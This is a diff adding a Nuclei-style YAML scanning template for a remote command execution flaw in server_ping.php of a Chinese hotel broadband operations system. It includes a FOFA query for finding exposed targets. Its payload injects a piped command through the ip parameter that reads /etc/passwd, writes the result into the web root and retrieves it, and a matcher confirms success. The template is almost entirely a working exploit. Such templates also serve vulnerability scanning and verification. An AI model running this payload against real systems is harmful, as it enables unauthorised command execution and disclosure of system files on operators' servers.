@@ -1,0 +1,33 @@
+id: amsz-jdyy-server_ping-rce
+
+info:
+  name: amsz-jdyy-server_ping-rce
+  author: yy
+  severity: high
+  description: 安美数字酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞。
+  tags: amsz,rce
+  metadata:
+    fofa-qeury: title=酒店宽带运营系统
+    veified: true
+    max-request: 2
+http:
+  - raw:
+      - |              
+        GET /manager/radius/server_ping.php?ip={{rce}}&id=1 HTTP/1.1
+        User-Agent: Mozilla/4.0 
+        Host: 
+      - |              
+        GET /xxx.txt HTTP/1.1
+        User-Agent: Mozilla/4.0 
+        Host:         
+
+    payloads:
+      rce:
+        - "127.0.0.1|cat%20/etc/passwd>../../xxx.txt"
+               
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code_1 == 200 && contains(body,'root:x') && contains(header,'text/plain')" 
+         
